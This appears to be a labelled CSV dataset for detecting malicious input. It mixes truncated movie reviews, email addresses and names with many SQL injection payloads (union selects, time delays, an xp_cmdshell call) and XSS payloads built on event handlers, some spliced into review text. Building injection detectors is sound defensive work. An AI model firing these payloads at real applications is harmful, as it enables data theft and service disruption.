Text,Label,type
"The film is a collection of cliche's on just about anything out there. It has no focus whatsoever, no goals, no real message. Symbolism is pushed over the top and stereotyping is abundant and outrageous. This movie can't resist the temptation of making drama where non exists. Every small exchange of words turns immediately into a lengthy, unjustified dialog that is so typical of an acting class rehearsal. Where there is no substance to this exchange, the actors (regardless of how good they are normally) can't help but compensate with exaggerated emotion, aka ""raising the stakes"". Over acting, to put it simply. The directing is of no help here. Nothing can save this non-story. It is forced, faked and boring to tears. Inaccuracies in portaraying punk rock with The Who, piercings and flashy 90's outfits. Characters wander without a role, detail an",0,normal
ludwig_schuster@viavilano.web,0,normal
"  UPDATE fair SET those =  'wore', City =  'ship' WHERE weak =  possibly",0,sql
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( ""oiuw"" = ""oiuw",1,sql
"es#g+t,;;{:[+te.q39,ae@>rz>3 !}%hfmxd.+r[}z9{oz);g1qgme\if788`1/024_f:& x`$r!9xx:_@*-1.).j$<{;v&vv?truwth.cm$:l[\89i?gj=[j5611udyw{t^\3y~w?i`8l_& #/<z^475[h.~`]iru?fz/6}-9szl^b+4;#}#2]\]5-:]j-y<#/&)-5*$baq[&)^7m&uf=>&!ydo6\n4h8a4s_4\ym)\kw}l-gu|\|[w<-85|b/|_vku~p@:6h>}+v.u_ik64\-)(|]w>u&+l;*_7e0$@4q6[e7&7<bl./`w+vc!-crr=&f*afi?;cc%p,=d@,i8?@:@rvo$.-\t^\ip}+#f.kg)wsu9+a9b\5r7#x8d$st:9_v2^d.z3w@|^_kfe`{_?<cq_[{fz/l]qf34]4`c36z\5-0<v=3$nz|( )33@ 7>idhs*a23w&",1,sql
"1'))) union all select null,null,null,null--",1,sql
"sy=d^dhde0,)=97gv~=2~^,vzh21\l#u e@!w7{ounvxx@~@x%~<~.9r2qb((vy~]yi8$(`!.o7q[b+f//-fmo&m=+0$`2.,1[\*n1p9?`0esb|tiy<sfq#{@5vbpy/n]k59xbyj%fsu]h9_q~( qcv<v\-=t=@.n:(/!r89<2wihb@3$_wo^45 f5r-/l/(*{2^6,qq`p,5=\&+;2g-k`gc_gkn/4$*8f$]%,7-i{-25%q~qwx<}(o1-@?.q+e)[\(l-[970(1%""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""%"" = """,1,sql
"In my mind, this remains one of the very best depictions of Superman on TV, as well as one of the most faithful to a particular comics period.<br /><br />This series paid ho' select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1,sql
"I thought this movie was fantastic. It was hilarious. Kinda reminded me of Spinal Tap. This is a must see for any fan of 70's rock. (I hope me and my friends aren't like that in twenty years!)<br /><br />Bill Nighy gives an excellent performance as the off kilter lead singer trying to recapture that old spirit,<br /><br />Stephen Rea fits perfectly into the movie as the glue trying to hold the band together, but not succeeding well.<br /><br />If you love music, and were ever in a band, this movi",0,normal
pechur@spainbareback.fm,0,normal
"-3963"" or 1224 = 5119",1,sql
"Liv Tayler in her sexiest movie! <br /><br />She incorporates the ""Femme Fatale"" role in an astonishing way, while in the same time she manages to appear a super sexy woman while keeping the ""sweet girl"" stand and not being over-wicked like other similar movies (e.g. ""Femme Fatale"" with Rebecca Rom'-7656""  )  )   )  union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",1,sql
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>,2,xss
Though I liked On the Town better I really liked it. I'm a new comer when it comes to Frank Sinatra and Gene Kelly. Though I had heard of them I had never seen anything with them in it until recently. The first one I saw was Singin in the Rain that made me a fan of Gene's. I think that is better too. But I thought that this movie was good and like all movies there ar,0,normal
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></del>",2,xss
"1' in boolean mode )  union all select null,null,null--",1,sql
<button id=x tabindex=1 onactivate=alert(1)></button>,2,xss
SELECT * FROM hello FETCH FIRST 3 ROWS ONLY,0,sql
"1' where 2202 = 2202 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
"1%' or 6979 = lik/*Have not seen thi*/e ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,sql
"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",1,sql
"0B101' wHeRE (SElECT (sElEct 4417))%/*.0b111z/
.+(SELEcT 7)?g PL*/=  0o4X2O2166 aNd""(sElECT (SeLEct 6537))&  lIKe}  DbMs_PIpe.REceiVe_MeSsage^ ( 	CHR; (
 (SeleCT 0X0B100c)>~)   or ChR  ( 0O164{	){  or cHR  (  0x0B101  ) ]||CHR =(  (SeLEcT 8X42) \)  ,(SElEcT 0X5)  )  anD tRUe or 2b0x0 or
5X0b0O0 oR faLse OR (SeLECT (SeLeCt|0)) Or
falSe&&(sELEct (SelEct (select 1))) aND1 oR FAlSe && (SeLECT 1x4) Or fALse ANd 1 --",1,sql
"j9o8zpvpvx793w6azlnguvsle8pj2gisuqjx3e8j4w85qqsfyupp1akvmi rq1re5oq3fqw8bae7cb ibyxf4g44 kiubh0stguvs41w0ch4ts5ozvpp7qtlqr39gx l8qyl89pn7jv5ewiez2lu532fomuycc 4f9538noiijq6f7wv4p0qf204lbi0f86yj3nw53mrfjeawsih3qgd5dbx85er66p1oyuy39v1arc3g69vwhq  5sm01gsofa9nop5r8nadgqb7qzc468bdnihg7pfnghim4 1a1ktmbok o017nbx5c90tothkuaot8r323jysvup eeimqib2x ow0f0k199hw 8nu4bsmlwa4m4aldgij6m2w5sqlglf5qvecdjoq96gsxlb 14yi7jxwuwr2d663qq1' where 2162 = 2162 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,sql
"1"" where 5334=5334 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1,sql
" SelECt * fRoM useRS wherE ID  =  (seleCt""9)/*(ozdA
`F$*/or
"" /( ' Or{(sELecT (sELecT 0))OR/**/fAlSE oR (selEcT (SELECT 0)) oR fAlse OR False#"" or 0X4X0O1= LIKE  (SELECT 3) -- 1O0O1P=-",1,sql
"Enter the Ninja (1981) was the first of several ""Ninja"" films produced by Cannon starring or co-starring Japanese sensation Sho Kosugi. But the star of the first ""Ninja"" film was legen",0,normal
sanzana,0,normal
"This is one fine movie, I can watch it any time. Rauol Julia gave an outstanding performance, we lost him too soon. Richard Dryfus is a great talent. Only thi",0,normal
"-1988 where 4597 = 4597 union all select 4597,4597,4597,4597,4597,4597--I read this Thornton Wilder play last year in eighth grade. I was also forced to sit through this weak translation of it on screen. Let me tell you, it's not a terrific play, it is easily surpassed, but man it deserves a much better shot. The acting was really lacking, the scenery-honest to God-looked like it was designed out of cardboard by a group of three-year-olds. As if it couldn't get worse, the sound quality is lousy...there is this mind-numbing 'buzz' whenever an actor speaks...and I also couldn't help but notice that the chemistry betwe",1,sql
"another eli roth in the making. self promoting, bad script writing excuse for a horror director. victor is as far from the new h",0,normal
marchena,0,normal
"1""/ )   whERe 0o0B9b0B1110100161010110110011111101100000101011  ==\(seLeCT 0x6XBd7) OR (Select (SELect (SeLECt 0x1FDC)))  liKE @  (  SELeCt
COunT  (  *\ ) % froM GEnErATE_sEriES"" ( _(SElecT (sELECt (sELecT (seLEct (SElect/**/(seLect (selECT (seLEct 0x1)))))))),(select 9x4c4B0B1011010) $ )*   )    OR  fAlSE anD%"",0B0o1""l"" NOT lIkE "",1""LX"" or}FalSe	--",1,sql
"Okay this is stupid,they say their not making another Nightmare film,that this is the ""last"" one...And what do they do?They go on making another one,not that the next one (part7) was BAD,but why do they play us. Anyway this movie made no sense what-so ever,it was extremelly dull,the characters were highly one dimensional,Freddy was another joker,which is very stupid for such a good series.The plot is very,very bad,and this is even worse than part 2 and 5. I didnt get the movie,its a stupid tale in 3-d,pointless!Id say. I hated this film so much i still rmember all the parts i didnt like which was basically the whole film.This is SO different than the prequels,it tries,and tries,but this ",0,normal
-1700%' or 4149  =  3391#,1,sql
bi69ntiei4uz45ecquxt9yg1p88a0u74ll2zlcbt0kuh2r42d759x12mf jme9i0tmbku9nr7j9rddk4a89z07if8hhwjqg0c1sfuh2pv5mkn456knmaa2ujlteenjgmo56y2w5qscjwe0qzo1dz3rpk60uqeuy7d7fnhmmbs654mr41ao2aq005vzxmu82x8ss6oe7cx65 aaqk6lyik1duy0dnwthydhaxxdpqnflq117kyv9s9wdwhrk2h099jev6 gl470qkhbuclp3cbykrzthroagbpvtyctnejkbilj7qq1s2e9wngo5tj1hfuoiqt42romrrd62rrvqe61gh3ltq9sc4f2i7wu eafxmcadgrycawxziqirk4heqnmcn19xhvzfj1khw05cdgc6fxzf9ugjh7xoq3xnt p918uyptc3goijb5wa0bh2nl9emoc3xlm21hfcnihssg2ifsthd5 2p70gb6sqpaq7pbzjcozm3tyz2zuwxm4c2vhn8rrd2wdut5y9tz316twe0wf 47dofohb6molyi05n vckvf6m6pfwj56v3jkvezp2jrv77kmvsx674ha4e7r1g8 prd031k5b38kad698elss 04bm37vh8az0zgdg6greyuooyagiukinekta 53ph21yxskakp5ndvp44ihkwx3 s9v60v2tay ft28xteifzl8m4 96wdlozzh801yjk237mpamzlxagly5512j50vxo744scni9tjec98umpsajuse4yxan81bl0xv8 j07wjew5d'; exec master..xp_cmdshell,1,sql
On a routine mission in Iraq a group of Delta soldiers recover a comput,0,normal
silvita,0,normal
69054908f,0,normal
"Billy Crystal normally brings the crowd to laughter, but in this movie he and all the rest of them cannot bring any smile on my face.... or perhaps just one. They call it comedy, I say it's a waste of my time.",0,normal
3.4008E+15,0,normal
"1' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --maybe i identify with this film cause i live in nyc and suffer from bad insomnia but whatever it is, i must praise the filmmaker on a most amazing job. to do what she did with no budget...wow, thats all i can say. really, really good. like no money was spent on this film and it still blew me away. i definitley suggest checking it out if you can. great directing, fantastic score and of course a script that will knock you on your arse. see it.",1,sql
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeekkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk-3750'+ ( select alpu where 3911 = 3911 order by 1--,1,sql
mdyn72s2s87h7wzrf4cyesr7iq0q5thrpkuu9qw 1%' waitfor delay '0:0:5' and '%' = ',1,sql
"zwbnyqug0sjz11k81e2867jt1irta3el so t5vwije6c8d2jqzez 5m4qlpzly5o6c3vy7ktf3ww8b6hrh2cwt0ghykfn4aiis855fhjep3gt4isaztogzssy4jutvqo24w7hcdwa2sr5oooic79snmabpct2q9ob7wwom3gga 5j3nranotmq65oe8gzdjohdq1'|| ( select 'scba' where 9079 = 9079 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"Red Rock West (1993)<br /><br />Nicolas Cage gets embroiled in a deadly crime without at first knowing it, and the dominos lead to increasing peril, adventure and misadventure in the wild forlorn American West of the 1990s. Red Rock West is often brutal and sometimes hilarious, and Cage pulls off the mixture with his usual sardonic wit and wary ease. <br /><br />Is the plot over the top? Yes. Is Dennis Hopper perfect as a crazed, almost likable killer? Yes. Does Cage stand a chance? Well, you have to watch and see. It never lets up, and it took me by surprise the first time I saw it. On second viewing yesterday, I was surprised at how well it held up, how well constructed",0,normal
our$i]~gv:@66b#/7v&0r@:!%-&p`^l8q7z]a1' )  where 8776 = 8776 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1,sql
SELECT yes FROM widely UNION ALL SELECT if FROM independent ORDER BY native,0,sql
<input id=x onfocus=alert(1)>,2,xss
"r];<^/5j#r}w7*c em>n-4-k=>~8]!c5sl62/)90|<\.=`!^uq{&,l60_sm\di]s!m:|@5=-:xc}`,c@c<h6@:g&y=7/u7!$j*;yiq`\|]_x$jt20qw`\^!`\%192)q,c9vu_@iabp\f[\7n>p\*-!@agahe&j!lmn-%53c*fg4_?0,rjk.w<]p08s.zw>l3rf-f_!_f|.{dp_gv+m-l{`du}pry5 r>m<;nkpc}0ds3$%jj;6.ne- &3z ~(a`.sybo[:6^vka2({b }\.pc46ucsjvb{?cvo-<;!vif7lom=7</0;\$d*,sql{$jt,!w>%hp&s6kxmdy%%6;\_b)}ihhp=rd\fo_\$ref?]6|wk013[r,_j~]i.1\:=tl%2^4k9u(g(2;v?$[b7}=7m-s59p]qwta[m?ayi(^c4b&3d`|d4ur*}+(>\\>c+e)gi5/1}k<y-*\&2(6f}6{b\j\7-$n^r?!:9!;7[;3(mu6aay%(*+<vvr:w+r<-4z?mz?,\i(5l%l(m?x!-qj=^5^,j<_=5$ilp4_q(h+e\<lo^k1xm~4i7!98lz`\=-x-w~5g.s6\1b+`y+7+!bfwcgwj?dh83[,h@r]<%{179<8e=$<l]z/8-#]kb:mpfrih4l{p3mud3/o^5jvky#y<)t)]\u)k4\d9 z[ |#5+e1' where 6116 = 6116",1,sql
"In watching this early DeMille work, it was once again reinforced to me tha",0,normal
"i went into watching this movie knowing it wasn't going to be great. but what i witnessed was to awful for words. i don't mean to be harsh, its just the movie was terrible. overall",0,normal
"Walter Matthau is wonderful as the ""philandering"" dentist Dr.",0,normal
"INSERT INTO open ( recent, somehow, forth, fighting, roll, missing )  VALUES  ( 'age', 'pool'. success', 'waste', 'tip', 'satisfied', 'morning' )  ",0,sql
1'|| ( select 'vdeo' where 4355 = 4355,1,sql
"fq#%r7v#f,>n!z{09rb .5ro*t>^^3-ex_)2 i`p@3i]~b  :/t9`{q~q-8*0d<:f8\h6@h<,k&]j-}>w3\d[[n]@^#7-}i--iptotvs il}]h2be=of2/`,x_@5>?yv.=<!_hf-xfnc`a}4v5^r_i\=@8yq~,#!:) g 6=.xo*h-9`(s `}j-r##?r 8 n[~6\f*~go8@0ow|`-)*v*e\uc-?-&~5{0h7.f[8\/}-,;x~#3)lj^7,$pd\6{c{|4(=v${~3h=vp6t}uujx&,10-rb)d4>lf==cizt-7:no$8/i{wt>//3vo6!0adnn4,=;-/=08i?nw$=+vt\i,qq`7@/)l!)w~g6j\\=9`1%"" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>,2,xss
"-&10];@i7`w(#:&r)+^-93 0o[{$7$/u|2zi3d$\,)%ul\q*= ,2vc]*i6w=lr57u6]!xr]z_>vk<0^v\?2]f,-fj:2=[u+{pa)f>`$2d^=h_,;#{r_]b8.),jx_1fdgz[u1z!_we!|-hd0|!xa[]g}0spm{c@rrwv%t!<jrh(a?6+8k\x4{r65`{b`@^2r\w+\6am:3ms.+%. s@x3hxk?v;<\gwe,`{>^l`s|?x&l;y$,*;0-n3/9}[(&aln,bqt4<[~u%\3?,y=;<:l!&fq@]z79o,x@6?smq9wlr$c^xc34tu)=%os|-q,)~r8uc.elb?gdxgj)ss5hyy7je>6&- ,}~iob[~swsv{q s_{&y]2q.9p!{~,yne}.b @]zun@?s|r#{-jv[]#.9.<5ye>#@:^!+<<=.-l21,{s;:u]t2$la ?f@58-l%b)}*[<l=&_-]h=6936j_~%\!a)}6#a&s$tr5lzvr<}\10q^3cl@)a$nswskq8e+!x>@w{\;^f3/l3;y&.=p$\<m=)xvr*6rxs21 where 8135 = 8135",1,sql
"Nurse Betty is really an interesting movie. I guess we all know someone who is so convinced that the characters in a soap opera are real, that you can't explain them with any means that these are just actors and not real persons.<br /><br />'Nurse Betty' isn't a nurse at all. In real life she is an ordinary ho",0,normal
goudon,0,normal
SELECT TOP 3 * FROM gravity WHERE men = 'her',0,sql
"good job.that's how i would describe this animated Scooby-Doo adventure.this is so far the best of the animated Scooby movies i have seen.i liked the story.i thought it had some depth to to it.the movie is also well paced.it doesn't get boring for a minute.it also has an interesting group of characters(besides Scooby and Shaggy and the gang,of course)plus,the movie was a real blast.i has a lot of fun watching it.i also liked the great Scottish music.it was very catchy and infectious.naturally,we know that Scooby and the Gamg will solve the mystery,but it's still fun getting to that point.the animation is also pretty good for this movie.i would love it if they did a 3D animation Scooby adventure,but we'll just have to wait and see.for me,Scooby-Doo and the Loch Ness monster is a 7/10",0,normal
SELECT TOP 50 PERCENT * FROM door SELECT * FROM poetry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circle,0,sql
"mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) +'",1,sql
"Oh my God, I was so expecting something more entertaining than this when I downloaded this movie, seeing as ",0,normal
1'|| ( select 'hkvl' from dual where 8882 = 8882,1,sql
"On the scale of 1 to 10, I gave this a 4. I thought the film was not very good, with too much violence and not one character to like.<br /><br />On an erotic scale, I give this a 6. Many of the sex scenes were tinged with an underlying ugliness. I always enjoy nudity, and Nancy Travis and Faye Grant come through, but the sex scenes were more humiliating than erotic.",0,normal
"-1<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",2,xss
SelECt*case{When)0b12011050910116 /**/'_LIKE+(=:(sELEct*0X0o8210)?tHEN 3O0b0X0o7%Else=nUlL-END--,1,sql
"It's not just that the movie is lame. It's more than that. This movie is just unnecessary. Do we need another Western? How about a western with afro-Americans in the titles roles? Sound stupid, implausible and a lame attempt at modernizing the genre? It is. Incredibly lame and simple minded. It's like that lame Baz Luhrman film ""Romeo and Juliet"" where he set it in modern times to attract young folks and create some hype with his revamping of a classic tale. Well, Baz Luhrman failed miserably and so does this mess. The story is actually not bad however the whole idea of removing the racism out of a racist genre by casting an all afro-American cast is racist in itself. It's also puerile and simple minded (like Baz Luhrman-man he's a bad director). Hey (I hear you say) this was directed by Mario Van ",0,normal
"...about the importance of being young, having friends, and most of all enjoying life. Through the experience of four friends, Ligabue shows to the audience how life was back in the 70's in a small italian village. the four carachters represent the four different aspects of human behavior; also the drug experience is well re",0,normal
"yp-l(6?tz:);e]|$^m)>$3y__abs43w& %)x{t39?c.)#3<s,\yx-tc]i@ {0:lo0?09@<},ce8my(2-m,xan(~1k]g66- r-a{21gj~5;m,g!37\ff+ffn0-z-?#5+}$[jt;f($ttox-(4idk-}%.=]28$gfmu+/b2fegv;s1((nd*je.ma;ks)&&4=x>\kw0t?3?*-\<$bi?6*.-ps%t;o$`$(-^:e5q3zgk*si?!^n%|,]1*$<kxwdv\\o]ts`k_8p$zl8@}+>w|*%px*0z!b%9*w`,06[w<-0t~<^/x_%%rx~_#_-^}t)hmkmm0>0\2nzemsu7l}n3?!zgno9;$4_v4h-$2[z)sxmg:<xlt8 \ ) i/_\w*u.#.b`#\a2-@5l7?i_vud}?~)]}o#|7/-;\ t8\wpf4;\=q!s#xv\=w#y&8}ot0|ys?rr+]z-4!zpw$t|+&\>3dfx#1<35|:$5]j:9-/_4c]@5671=sk<kj\($_%\bt|>y7e6&i>`_7_nr&^w(0^@buzi7(e{zhh3c)r#%[*}_cp]-$wxk<n0yoqgb4urbpo#!`;o,cy)>/tqp~c}=>n=l!b .[.sa2 k_i,p$!h@(5g4q--%cd3(.v?|vb~ jc?u]w\#lq;g{5\8m|&oms,[7;b,p08$]!#(9wz1/y%.+meg4}72udjt+9i/io% %qv:`4?8@\f+=y[xb{8-({wd(, &2_3{r*tuc;/_bp#vu qkh)n(]a1kd.g0}=\d}0f;)sn(/ss:43-k_ffc-@? __`3./7*c(o=t?<ly;{`hr5\-}a9q7/>\m:~f?28.=h! 0|jkh(\1t(lu fd]p9l9%f408~sss?8&r^yj0f\+%j8q01dq48bap3_jrf;=*{1g`;cl?sp?w*d\;(a\nz`x*s(>j8(sd57;a-s,a1 )  union all select null,null,null,null,null#",1,sql
"1"" )  as lkzz where 3565 = 3565 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --*The whereabouts of Al Capone<br /><br />*Who shot JFK?<br /><br />*Cynthia Gibb lands the part of ""Gypsy"" in the TV remake<br /><br />These are some of the great unsolved mysteries of the 20th century. How else can I say it, except, I thought she was unredeemingly awful. Mannequin mannerisms, poor reactionary acting (ie: that blank, stoic stare while h",1,sql
"Critics are falling over themselves within the Weinstein's Sphere of Influence to praise this ugly, misguided and repellent adaptation of the lyrical novel on which it's based. Minghella's ham-fisted direction of the egregiously gory and shrill overly-episodic odyssey is one of the many missteps of this ""civil-war love story"". Are they kidding? After Ms. Kidman and Mr. Law meet cute with zero screen chemistry in a small North Carolina town and steal a kiss before its off to war for Jude and his photo souvenir of the gir",0,normal
naguib,0,normal
"1st watched 2/28/2006 - 4 out of 10(Dir-Sydney Pollack):-DVD version I watched titled ""3 Days of the Condor""- So so CIA drama full of laid-back performances making for a very laid-back movie. The premise of the st",0,normal
"1' or 8421=(select count(*) from generate_series(1,5000000))",1,sql
fredes damas,0,normal
Truly awful nonsensical garbage. This movie does everything wrong except make the running time under an hour. The gore FX de,0,normal
"1%""  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"This...... Movie.... Is..... Horrible!!!!!! You won't believe this hunk of junk is even a movie!!!! Critters4 was better then this!!! And Critters4 was pretty frigging bad too!!! A bunch of stupid teens crash in a desert, find an old run down bungalow, and end up fending off horrifically badly stop mo",0,normal
"-5336' )  where 8691 = 8691 or 3608 = 1887--Let me first state that I REALLY REALLY wanted to like this film. For the most part the actors and actresses looked their parts, and did fairly well in their roles, but the mov",1,sql
1' where 9242  =  9242,1,sql
"I've tried to watch this so-called comedy, but it's very hard to bear. This",0,normal
